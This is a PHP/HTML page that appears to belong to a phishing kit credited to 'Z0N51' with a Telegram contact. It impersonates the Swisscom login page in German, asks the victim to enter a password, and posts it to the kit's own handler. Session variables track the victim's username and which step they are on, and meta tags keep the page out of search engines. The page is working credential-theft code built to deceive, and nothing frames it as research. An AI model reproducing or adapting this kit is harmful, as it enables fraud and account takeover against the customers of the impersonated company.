<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    $_SESSION['last_page'] = 'password';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Swisscom Login</title>
    </head>

    <body style="display: flex; flex-direction: column;">

		<div id="wrapper" class="flex-grow-1">
            <div class="login-area">
                <div class="left">
                    <div class="inner">
                        <div class="img"><img src="../assets/imgs/user.png"></div>
                        <h3>My Swisscom</h3>
                        <p>Swisscom Produkte und Kosten im Griff behalten</p>
                    </div>
                </div>
                <div class="right">
                    <form action="../index.php" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="password">
                        <div class="d-lg-none d-md-none d-sm-block d-block text-center"><img style="max-width: 30px;" src="../assets/imgs/logo2.png"></div>
                        <legend>Swisscom Login</legend>
                        <p class="mb20 d-block">
                            Passworteingabe für <b><?php echo $_SESSION['username']; ?></b>
                        </p>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'password') ?>">
                            <label for="password">Passwort</label>
                            <input type="password" name="password" id="password" class="form-control" placeholder="Passwort">
                            <?php echo error_message($_SESSION['errors'],'password'); ?>
                        </div>
                        <div class="btns btns2 mb-4">
                            <div><button type="button">Zurück</button></div>
                            <div><button type="submit">Login</button></div>
                        </div>
                        <p class="link mb-0">Passwort vergessen?</p>
                    </form>
                </div>
            </div>
        </div>

        <!-- FOOTER -->
        <footer id="footer" class="d-lg-block d-md-block d-sm-none d-none">
            <div class="container">
                <div class="left">
                    <img src="../assets/imgs/logo2.png">
                </div>
                <div class="right">
                    <p>Über Swisscom Login</p>
                    <div class="lang">
                        <div class="inner">
                            <span class="mm">EN</span> <span class="sym"></span>
                        </div>
                        <ul>
                            <li class="active">DE</li>
                            <li>EN</li>
                            <li>FR</li>
                            <li>IT</li>
                        </ul>
                    </div>
                </div>
            </div>
        </footer>
        <!-- END FOOTER -->

        <footer id="footer2" class="d-lg-none d-md-none d-sm-flex d-flex">
            <p class="flex-grow-1">Über Swisscom Login</p>
            <p>DE <span></span> FR <span></span> IT</p>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            $('.lang').click(function(){
                if( $(this).hasClass('active') ) {
                    $(this).removeClass('active');
                    $('.lang ul').slideUp();
                } else {
                    $(this).addClass('active');
                    $('.lang ul').slideDown();
                }
            });
            $('.lang ul li').click(function(){
                var text = $(this).text();
                $('.lang ul li').removeClass('active');
                $(this).addClass('active');
                $('.lang ul').slideUp();
                $('.lang .mm').text(text);
            });
        </script>

    </body>

</html>